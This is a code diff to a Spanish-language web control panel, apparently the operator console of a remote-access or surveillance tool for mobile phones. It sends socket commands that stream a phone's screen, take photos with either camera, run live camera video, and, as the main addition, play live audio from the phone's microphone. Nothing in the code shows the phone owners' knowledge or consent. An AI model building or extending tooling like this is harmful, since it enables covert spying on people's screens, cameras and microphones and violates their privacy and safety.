@@ -29,7 +29,9 @@
   </head>
   <body class="p-4 md:p-6 min-h-screen flex flex-col justify-between">
     <!-- Header -->
-    <header class="neon-border bg-[#0A0F1D] p-4 rounded-lg mb-6 flex flex-col md:flex-row justify-between items-center">
+    <header
+      class="neon-border bg-[#0A0F1D] p-4 rounded-lg mb-6 flex flex-col md:flex-row justify-between items-center"
+    >
       <div class="flex items-center space-x-3 mb-2 md:mb-0">
         <div class="w-3 h-3 bg-[#00E5FF] rounded-full animate-ping"></div>
         <h1 class="text-lg md:text-xl font-bold tracking-widest text-[#00E5FF]">
@@ -37,8 +39,11 @@
         </h1>
       </div>
       <div class="flex items-center space-x-4 text-xs">
-        <span class="text-gray-400">ESTADO:
-          <span id="engineStatus" class="font-bold text-yellow-400">CONECTANDO...</span>
+        <span class="text-gray-400"
+          >ESTADO:
+          <span id="engineStatus" class="font-bold text-yellow-400"
+            >CONECTANDO...</span
+          >
         </span>
         <span id="clock" class="text-[#00FF66] font-mono">00:00:00</span>
       </div>
@@ -46,21 +51,38 @@
 
     <!-- Main Grid -->
     <main class="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-grow mb-6">
-      
       <!-- Columna 1: Nodos Móviles y Logs -->
       <section class="neon-border bg-[#0A0F1D]/80 p-4 rounded-lg flex flex-col">
-        <div class="flex justify-between items-center mb-4 border-b border-[#00E5FF]/30 pb-2">
-          <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">> NODOS MÓVILES</h2>
-          <span id="deviceCount" class="text-xs bg-[#00E5FF]/20 text-[#00E5FF] px-2 py-1 rounded">0 ACTIVOS</span>
+        <div
+          class="flex justify-between items-center mb-4 border-b border-[#00E5FF]/30 pb-2"
+        >
+          <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">
+            > NODOS MÓVILES
+          </h2>
+          <span
+            id="deviceCount"
+            class="text-xs bg-[#00E5FF]/20 text-[#00E5FF] px-2 py-1 rounded"
+            >0 ACTIVOS</span
+          >
         </div>
-        <div id="devicesContainer" class="space-y-3 overflow-y-auto max-h-[400px] flex-grow pr-1 mb-4">
-          <div class="text-center py-8 text-gray-500 text-xs border border-dashed border-gray-800 rounded">
+        <div
+          id="devicesContainer"
+          class="space-y-3 overflow-y-auto max-h-[400px] flex-grow pr-1 mb-4"
+        >
+          <div
+            class="text-center py-8 text-gray-500 text-xs border border-dashed border-gray-800 rounded"
+          >
             [ ESCANEANDO RED... ]
           </div>
         </div>
         <div>
-          <h3 class="text-xs font-bold text-gray-400 mb-2">> LOGS DE ACTIVIDAD</h3>
-          <div id="logConsole" class="bg-black/80 border border-gray-800 rounded p-2 h-28 overflow-y-auto text-[10px] text-green-400 font-mono">
+          <h3 class="text-xs font-bold text-gray-400 mb-2">
+            > LOGS DE ACTIVIDAD
+          </h3>
+          <div
+            id="logConsole"
+            class="bg-black/80 border border-gray-800 rounded p-2 h-28 overflow-y-auto text-[10px] text-green-400 font-mono"
+          >
             [System] Interfaz cargada correctamente...<br />
           </div>
         </div>
@@ -68,15 +90,28 @@
 
       <!-- Columna 2: Transmisión de Pantalla en Vivo -->
       <section class="neon-border bg-[#0A0F1D]/80 p-4 rounded-lg flex flex-col">
-        <div class="flex justify-between items-center border-b border-[#00E5FF]/30 pb-2 mb-4">
+        <div
+          class="flex justify-between items-center border-b border-[#00E5FF]/30 pb-2 mb-4"
+        >
           <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">
             > TRANSMISIÓN DE PANTALLA
           </h2>
-          <span id="streamingTarget" class="text-[10px] text-yellow-400">[ Ningún nodo seleccionado ]</span>
+          <span id="streamingTarget" class="text-[10px] text-yellow-400"
+            >[ Ningún nodo seleccionado ]</span
+          >
         </div>
-        <div class="relative w-full h-[380px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden mb-3">
-          <img id="screenStream" alt="Transmisión en vivo..." class="object-contain w-full h-full hidden" />
-          <span id="screenPlaceholder" class="text-xs text-gray-500 text-center px-4">
+        <div
+          class="relative w-full h-[380px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden mb-3"
+        >
+          <img
+            id="screenStream"
+            alt="Transmisión en vivo..."
+            class="object-contain w-full h-full hidden"
+          />
+          <span
+            id="screenPlaceholder"
+            class="text-xs text-gray-500 text-center px-4"
+          >
             [ SELECCIONA UN NODO E INICIA STREAM ]
           </span>
         </div>
@@ -84,24 +119,39 @@
 
       <!-- Columna 3: Visor de Capturas / Cámara en Vivo -->
       <section class="neon-border bg-[#0A0F1D]/80 p-4 rounded-lg flex flex-col">
-        <div class="flex justify-between items-center border-b border-[#00E5FF]/30 pb-2 mb-4">
+        <div
+          class="flex justify-between items-center border-b border-[#00E5FF]/30 pb-2 mb-4"
+        >
           <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">
             > VISOR TÁCTICO // CÁMARA & FOTO
           </h2>
-          <span id="cameraTarget" class="text-[10px] text-yellow-400">[ Cámara Inactiva ]</span>
+          <span id="cameraTarget" class="text-[10px] text-yellow-400"
+            >[ Cámara Inactiva ]</span
+          >
         </div>
-        <div class="relative w-full h-[380px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden">
-          <img id="targetPhoto" src="" alt="Visor de cámara..." class="object-contain w-full h-full hidden" />
-          <span id="photoPlaceholder" class="text-xs text-gray-600 text-center px-4">
+        <div
+          class="relative w-full h-[380px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden"
+        >
+          <img
+            id="targetPhoto"
+            src=""
+            alt="Visor de cámara..."
+            class="object-contain w-full h-full hidden"
+          />
+          <span
+            id="photoPlaceholder"
+            class="text-xs text-gray-600 text-center px-4"
+          >
             [ SELECCIONA CÁMARA Y ACCEDE ]
           </span>
         </div>
       </section>
-
     </main>
 
     <!-- Footer -->
-    <footer class="text-center text-[10px] text-gray-600 tracking-widest border-t border-gray-900 pt-2">
+    <footer
+      class="text-center text-[10px] text-gray-600 tracking-widest border-t border-gray-900 pt-2"
+    >
       SECURE SURVEILLANCE NODE SYSTEM V2.6 // AUTHORIZED ACCESS ONLY
     </footer>
 
@@ -121,11 +171,16 @@
       const cameraTarget = document.getElementById("cameraTarget");
 
       let activeStreamDevice = null;
+      let isStreamingActive = false;
+
       let activeCameraDevice = null;
+      let isCameraActive = false;
 
       setInterval(() => {
         const now = new Date();
-        document.getElementById("clock").innerText = now.toTimeString().split(" ")[0];
+        document.getElementById("clock").innerText = now
+          .toTimeString()
+          .split(" ")[0];
       }, 1000);
 
       function log(msg) {
@@ -156,65 +211,94 @@
 
         devices.forEach((dev) => {
           const card = document.createElement("div");
-          card.className = "bg-[#111B2B] border border-[#00E5FF]/30 p-2.5 rounded flex flex-col justify-between space-y-2";
+          card.className =
+            "bg-[#111B2B] border border-[#00E5FF]/30 p-2.5 rounded flex flex-col justify-between space-y-2";
           card.innerHTML = `
-            <div>
-                <div class="text-xs font-bold text-[#00E5FF]">${dev.name}</div>
-                <div class="text-[9px] text-gray-400 truncate">ID: ${dev.id}</div>
-            </div>
-            <!-- Controles de Pantalla tipo Interruptor -->
-            <div class="grid grid-cols-2 gap-1">
-                <button id="screen_btn_${dev.id}" onclick="toggleScreen('${dev.id}', '${dev.name}', this)" data-active="false" class="bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded hover:bg-gray-600 transition text-center">
-                    📺 STREAM: OFF
-                </button>
-                <button onclick="triggerPhoto('${dev.id}')" class="bg-[#00E5FF] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00b3cc] transition text-center">
-                    📸 FOTO
-                </button>
-            </div>
-            <!-- Controles de Cámara tipo Interruptor -->
-            <div class="grid grid-cols-2 gap-1 pt-1 border-t border-gray-800">
-                <select id="lens_${dev.id}" class="bg-black text-[9px] text-[#00E5FF] border border-[#00E5FF]/40 rounded p-0.5">
-                    <option value="back">Trasera</option>
-                    <option value="front">Frontal</option>
-                </select>
-                <button id="cam_btn_${dev.id}" onclick="toggleCamera('${dev.id}', '${dev.name}', this)" data-active="false" class="bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded hover:bg-gray-600 transition text-center">
-                    📹 CAM: OFF
-                </button>
-            </div>
-          `;
+          <div>
+              <div class="text-xs font-bold text-[#00E5FF]">${dev.name}</div>
+              <div class="text-[9px] text-gray-400 truncate">ID: ${dev.id}</div>
+          </div>
+          <!-- Controles de Pantalla -->
+          <div class="grid grid-cols-2 gap-1">
+              <button id="screen_btn_${dev.id}" onclick="toggleScreen('${dev.id}', '${dev.name}', this)" data-active="false" class="bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded hover:bg-gray-600 transition text-center">
+                  📺 STREAM: OFF
+              </button>
+              <button onclick="triggerPhoto('${dev.id}')" class="bg-[#00E5FF] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00b3cc] transition text-center">
+                  📸 FOTO
+              </button>
+          </div>
+          <!-- Controles de Cámara -->
+          <div class="grid grid-cols-2 gap-1 pt-1 border-t border-gray-800">
+              <select id="lens_${dev.id}" class="bg-black text-[9px] text-[#00E5FF] border border-[#00E5FF]/40 rounded p-0.5">
+                  <option value="back">Trasera</option>
+                  <option value="front">Frontal</option>
+              </select>
+              <button id="cam_btn_${dev.id}" onclick="toggleCamera('${dev.id}', '${dev.name}', this)" data-active="false" class="bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded hover:bg-gray-600 transition text-center">
+                  📹 CAM: OFF
+              </button>
+          </div>
+          <!-- Control de Audio Independiente por Celular -->
+          <div class="grid grid-cols-1 pt-1 border-t border-gray-800">
+              <button
+                id="audio_btn_${dev.id}"
+                onclick="toggleAudio('${dev.id}', '${dev.name}', this)"
+                data-active="false"
+                class="bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded hover:bg-gray-600 transition text-center"
+              >
+                🎤 AUDIO: OFF
+              </button>
+          </div>
+        `;
           devicesContainer.appendChild(card);
         });
       });
 
       function toggleScreen(socketId, deviceName, btn) {
         const isActive = btn.getAttribute("data-active") === "true";
-        
+
         if (!isActive) {
           activeStreamDevice = socketId;
+          isStreamingActive = true;
           streamingTarget.innerText = `[ Pantalla: ${deviceName} ]`;
           btn.setAttribute("data-active", "true");
           btn.innerText = "📺 STREAM: ON";
-          btn.className = "bg-[#00FF66] text-black text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          btn.className =
+            "bg-[#00FF66] text-black text-[9px] font-bold py-1 px-1 rounded transition text-center";
           log(`Iniciando transmisión de pantalla para: ${deviceName}`);
-          socket.emit("send_command_to_device", { targetId: socketId, action: "start_screen" });
+          socket.emit("send_command_to_device", {
+            targetId: socketId,
+            action: "start_screen",
+          });
         } else {
           btn.setAttribute("data-active", "false");
           btn.innerText = "📺 STREAM: OFF";
-          btn.className = "bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          btn.className =
+            "bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
           log(`Pausando transmisión de pantalla para: ${deviceName}`);
-          socket.emit("send_command_to_device", { targetId: socketId, action: "stop_screen" });
-          if (activeStreamDevice === socketId) {
-            screenStream.classList.add("hidden");
-            screenPlaceholder.classList.remove("hidden");
-          }
+
+          isStreamingActive = false;
+          activeStreamDevice = null;
+          streamingTarget.innerText = "[ Ningún nodo seleccionado ]";
+
+          screenStream.src = "";
+          screenStream.classList.add("hidden");
+          screenPlaceholder.classList.remove("hidden");
+
+          socket.emit("send_command_to_device", {
+            targetId: socketId,
+            action: "stop_screen",
+          });
         }
       }
 
       function triggerPhoto(socketId) {
         const lens = document.getElementById(`lens_${socketId}`).value;
-        activeCameraDevice = socketId;
         log(`Solicitando foto (${lens}) al nodo: ${socketId}`);
-        socket.emit("send_command_to_device", { targetId: socketId, action: "get_photo", lens: lens });
+        socket.emit("send_command_to_device", {
+          targetId: socketId,
+          action: "get_photo",
+          lens: lens,
+        });
       }
 
       function toggleCamera(socketId, deviceName, btn) {
@@ -223,28 +307,139 @@
 
         if (!isActive) {
           activeCameraDevice = socketId;
+          isCameraActive = true;
           cameraTarget.innerText = `[ Cámara (${lens}): ${deviceName} ]`;
           btn.setAttribute("data-active", "true");
           btn.innerText = `📹 CAM: ON`;
-          btn.className = "bg-purple-600 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          btn.className =
+            "bg-purple-600 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
           log(`Iniciando cámara (${lens}) para: ${deviceName}`);
-          socket.emit("send_command_to_device", { targetId: socketId, action: "start_camera", lens: lens });
+          socket.emit("send_command_to_device", {
+            targetId: socketId,
+            action: "start_camera",
+            lens: lens,
+          });
         } else {
           btn.setAttribute("data-active", "false");
           btn.innerText = "📹 CAM: OFF";
-          btn.className = "bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          btn.className =
+            "bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
           log(`Apagando cámara para: ${deviceName}`);
-          socket.emit("send_command_to_device", { targetId: socketId, action: "stop_camera" });
-          if (activeCameraDevice === socketId) {
-            targetPhoto.classList.add("hidden");
-            photoPlaceholder.classList.remove("hidden");
-          }
+
+          isCameraActive = false;
+          activeCameraDevice = null;
+          cameraTarget.innerText = "[ Cámara Inactiva ]";
+
+          targetPhoto.src = "";
+          targetPhoto.classList.add("hidden");
+          photoPlaceholder.classList.remove("hidden");
+
+          socket.emit("send_command_to_device", {
+            targetId: socketId,
+            action: "stop_camera",
+          });
         }
       }
 
-      // Recepción de respuestas y frames
+      let activeAudioDevice = null;
+      let isAudioActive = false;
+      let audioCtx = null;
+      let nextTime = 0;
+
+      function toggleAudio(socketId, deviceName, btn) {
+        const isActive = btn.getAttribute("data-active") === "true";
+
+        if (!isActive) {
+          activeAudioDevice = socketId;
+          isAudioActive = true;
+          btn.setAttribute("data-active", "true");
+          btn.innerText = "🎤 AUDIO: ON";
+          btn.className =
+            "bg-green-600 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          log(`Iniciando escucha de micrófono para: ${deviceName}`);
+
+          if (!audioCtx) {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)({
+              sampleRate: 16000,
+            });
+          }
+          if (audioCtx.state === "suspended") {
+            audioCtx.resume();
+          }
+          nextTime = audioCtx.currentTime;
+
+          socket.emit("send_command_to_device", {
+            targetId: socketId,
+            action: "start_audio",
+          });
+        } else {
+          btn.setAttribute("data-active", "false");
+          btn.innerText = "🎤 AUDIO: OFF";
+          btn.className =
+            "bg-gray-700 text-white text-[9px] font-bold py-1 px-1 rounded transition text-center";
+          log(`Deteniendo escucha de micrófono para: ${deviceName}`);
+
+          isAudioActive = false;
+          activeAudioDevice = null;
+          socket.emit("send_command_to_device", {
+            targetId: socketId,
+            action: "stop_audio",
+          });
+        }
+      }
+
+      socket.on("audio_chunk", (data) => {
+        if (
+          isAudioActive &&
+          data.deviceId === activeAudioDevice &&
+          data.chunk
+        ) {
+          playAudioChunk(data.chunk);
+        }
+      });
+
+      function playAudioChunk(base64Data) {
+        if (!audioCtx) return;
+
+        try {
+          const binaryString = atob(base64Data);
+          const len = binaryString.length;
+          const bytes = new Uint8Array(len);
+          for (let i = 0; i < len; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+          }
+
+          const int16 = new Int16Array(bytes.buffer);
+          const float32 = new Float32Array(int16.length);
+          for (let i = 0; i < int16.length; i++) {
+            float32[i] = int16[i] / 32768.0;
+          }
+
+          const buffer = audioCtx.createBuffer(1, float32.length, 16000);
+          buffer.copyToChannel(float32, 0);
+
+          const source = audioCtx.createBufferSource();
+          source.buffer = buffer;
+          source.connect(audioCtx.destination);
+
+          const currentTime = audioCtx.currentTime;
+          if (nextTime < currentTime) {
+            nextTime = currentTime;
+          }
+
+          source.start(nextTime);
+          nextTime += buffer.duration;
+        } catch (e) {
+          console.error("Error al procesar chunk de audio:", e);
+        }
+      }
+
       socket.on("phone_response", (data) => {
-        if (data.deviceId === activeCameraDevice && data.type === "photo" && data.image) {
+        if (
+          data.deviceId === activeCameraDevice &&
+          data.type === "photo" &&
+          data.image
+        ) {
           log("¡Fotografía recibida del dispositivo activo!");
           targetPhoto.src = `data:image/jpeg;base64,${data.image}`;
           targetPhoto.classList.remove("hidden");
@@ -253,7 +448,7 @@
       });
 
       socket.on("screen_frame", (data) => {
-        if (data.deviceId === activeStreamDevice) {
+        if (isStreamingActive && data.deviceId === activeStreamDevice) {
           screenStream.src = `data:image/jpeg;base64,${data.frame}`;
           screenStream.classList.remove("hidden");
           screenPlaceholder.classList.add("hidden");
@@ -261,7 +456,7 @@
       });
 
       socket.on("camera_frame", (data) => {
-        if (data.deviceId === activeCameraDevice) {
+        if (isCameraActive && data.deviceId === activeCameraDevice) {
           targetPhoto.src = `data:image/jpeg;base64,${data.frame}`;
           targetPhoto.classList.remove("hidden");
           photoPlaceholder.classList.add("hidden");
